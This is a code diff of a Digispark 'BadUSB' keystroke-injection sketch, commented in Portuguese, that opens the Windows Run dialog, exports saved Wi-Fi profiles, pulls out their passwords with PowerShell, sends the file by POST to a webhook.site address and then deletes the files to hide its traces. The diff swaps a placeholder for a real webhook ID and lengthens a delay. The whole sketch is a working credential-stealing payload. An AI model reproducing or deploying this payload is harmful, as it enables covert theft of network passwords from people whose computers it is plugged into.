@@ -9,7 +9,6 @@ void exploitWindows(void);
 
 void setup() {
   //Identificando LEDs como saida de dados.
-  
   pinMode(0, OUTPUT);
   pinMode(1, OUTPUT); 
 
@@ -31,7 +30,7 @@ void loop() {
   void exploitWindows(void){
 
   DigiKeyboard.update();  //Mantendo comunicação USB com o dispositivo, importante chamar esta no começo de cada payload.
-  DigiKeyboard.delay(200);  // Delays como este podem ser alterados para adaptar o código para funcionar em máquinas mais lentas.
+  DigiKeyboard.delay(800);  // Delays como este podem ser alterados para adaptar o código para funcionar em máquinas mais lentas.
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //Pressionando teclas Windows + R simultaneamente, isso é um atalho para o "executar".
   DigiKeyboard.delay(100);
   
@@ -49,7 +48,7 @@ void loop() {
   DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-SENHA"); //Extraindo todos perfis (Logins e senhas) para um arquivo só
   DigiKeyboard.delay(500);
   
-  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/INSIRA-SEU-ID -Method POST -InFile Wi-Fi-SENHA"); //Enviando conteudo do arquivo para o webhook através de uma requisição POST
+  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/2c2fb5f4-b2da-43cc-b8a6-25e68179a93a -Method POST -InFile Wi-Fi-SENHA"); //Enviando conteudo do arquivo para o webhook através de uma requisição POST
   DigiKeyboard.delay(10000);
   
   DigiKeyboard.println("del Wi-* /s /f /q"); // Apagando seus rastros.
